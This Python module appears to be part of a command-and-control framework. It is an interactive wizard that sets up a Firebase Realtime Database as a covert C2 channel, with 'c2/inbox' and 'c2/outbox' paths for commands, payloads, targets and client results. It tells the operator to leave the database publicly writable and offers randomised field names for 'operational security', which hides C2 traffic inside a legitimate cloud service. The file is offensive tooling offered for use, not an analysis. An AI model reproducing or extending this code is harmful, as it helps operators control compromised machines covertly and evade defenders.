import os
import random
import string

import requests

from wizard.channel.base import WizardChannel
from wizard import core

INBOX_FIELDS  = ["command_id", "command", "payload", "target", "status", "created_at"]
OUTBOX_FIELDS = ["command_id", "client_id", "status", "result", "timestamp"]


def _random_name(length=5):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _generate_maps():
    return {
        "inbox":  {f: _random_name() for f in INBOX_FIELDS},
        "outbox": {f: _random_name() for f in OUTBOX_FIELDS},
    }


def _validate_firebase_url(v):
    if not v.startswith("https://"):
        return "Must start with https://"
    if ".firebaseio.com" not in v and ".firebasedatabase.app" not in v:
        return "Expected a Firebase Realtime Database URL (*.firebaseio.com or *.firebasedatabase.app)"


def _validate_path(v):
    if v.startswith("/") or v.endswith("/"):
        return "Path should not start or end with a slash (e.g. c2/inbox)"


def _test_connection(base_url, test_path):
    """Write and delete a test entry. Returns (ok: bool, error: str)."""
    url = f"{base_url.rstrip('/')}/{test_path.strip('/')}/wizard_test.json"
    try:
        resp = requests.put(url, json={"wizard": "ok"}, timeout=10)
        if not resp.ok:
            return False, f"PUT failed: {resp.status_code} {resp.text[:120]}"
        resp = requests.delete(url, timeout=10)
        if not resp.ok:
            return False, f"DELETE failed: {resp.status_code} {resp.text[:120]}"
        return True, ""
    except Exception as e:
        return False, str(e)


class FirebaseWizard(WizardChannel):
    @property
    def name(self):
        return "firebase"

    def setup(self, obfuscation):
        return self._manual_setup(obfuscation)

    def _manual_setup(self, obfuscation):
        # ── Firebase project setup ─────────────────────────────────────────────
        core.section("Firebase — Realtime Database")
        core.info("Firebase Realtime Database is a cloud-hosted JSON store with a")
        core.info("simple REST API. No SDK or API key required on the client —")
        core.info("all reads and writes are plain HTTPS requests.")
        core.info()
        core.info("Field name obfuscation replaces logical JSON keys (command_id,")
        core.info("status, etc.) with random strings — recommended alongside Fernet.")
        core.info()
        core.info("Create your database:")
        core.info("  1. Go to https://console.firebase.google.com")
        core.info("  2. Create a new project (or select an existing one)")
        core.info("  3. In the left sidebar: Build → Realtime Database")
        core.info("  4. Click 'Create Database'")
        core.info("  5. Choose a region, then select 'Start in test mode'")
        core.info("     (rules: public read/write — encryption keeps content secure)")
        core.info("  6. Your database URL appears at the top of the page:")
        core.info("     US:  https://<project-id>-default-rtdb.firebaseio.com")
        core.info("     EU:  https://<project-id>-default-rtdb.<region>.firebasedatabase.app")
        core.pause()

        firebase_url = core.ask(
            "Firebase database URL",
            validator=_validate_firebase_url,
        )
        firebase_url = firebase_url.rstrip("/")

        # ── Paths ──────────────────────────────────────────────────────────────
        core.info()
        core.info("Choose paths within the database for the C2 inbox and outbox.")
        core.info("Defaults are fine for most setups.")
        core.info()

        inbox_path = core.ask(
            "Inbox path",
            default="c2/inbox",
            validator=_validate_path,
        )
        outbox_path = core.ask(
            "Outbox path",
            default="c2/outbox",
            validator=_validate_path,
        )

        # ── Connection test ────────────────────────────────────────────────────
        core.info()
        core.info("Testing connection (write + delete a test entry)...")
        ok, err = _test_connection(firebase_url, inbox_path)
        if ok:
            core.success("Connection test passed")
        else:
            core.warn(f"Connection test failed: {err}")
            core.warn("Common causes:")
            core.warn("  - Database rules are not set to test mode (public read/write)")
            core.warn("  - URL is incorrect or the database has not been created yet")
            core.warn("  - No internet access to firebaseio.com")
            if not core.ask_yn("Continue anyway?", default=False):
                core.warn("Aborting Firebase setup — channel env vars not written.")
                return {}

        core.success("Firebase channel configured")

        # ── Field name obfuscation ─────────────────────────────────────────────
        env = {
            "CHANNEL":              "firebase",
            "FIREBASE_URL":         firebase_url,
            "FIREBASE_INBOX_PATH":  inbox_path,
            "FIREBASE_OUTBOX_PATH": outbox_path,
        }

        import json
        inbox_map  = obfuscation.get("inbox",  {}) if obfuscation else {}
        outbox_map = obfuscation.get("outbox", {}) if obfuscation else {}

        if inbox_map:
            # Reuse maps generated in the Sheets obfuscation step
            core.info()
            core.success("Reusing column obfuscation maps from Step 2 for Firebase field names")
            env["FIREBASE_INBOX_COLUMN_MAP"]  = json.dumps(inbox_map)
            env["FIREBASE_OUTBOX_COLUMN_MAP"] = json.dumps(outbox_map)
        else:
            core.info()
            core.info("Field name obfuscation replaces JSON keys with random strings.")
            core.info("Recommended — combine with Fernet for full operational security.")
            if core.ask_yn("Enable Firebase field name obfuscation?", default=True):
                maps = _generate_maps()
                core.info()
                core.info("Generated field name mapping:")
                core.info()
                core.info("  Inbox fields:")
                for logical, rand in maps["inbox"].items():
                    core.info(f"    {logical:<20} →  {rand}")
                core.info()
                core.info("  Outbox fields:")
                for logical, rand in maps["outbox"].items():
                    core.info(f"    {logical:<20} →  {rand}")
                core.info()
                core.info("Both server and client .env must use the same maps.")
                env["FIREBASE_INBOX_COLUMN_MAP"]  = json.dumps(maps["inbox"])
                env["FIREBASE_OUTBOX_COLUMN_MAP"] = json.dumps(maps["outbox"])
                core.success("Field name obfuscation enabled")
            else:
                core.success("Field name obfuscation disabled — logical names will be used")

        return env
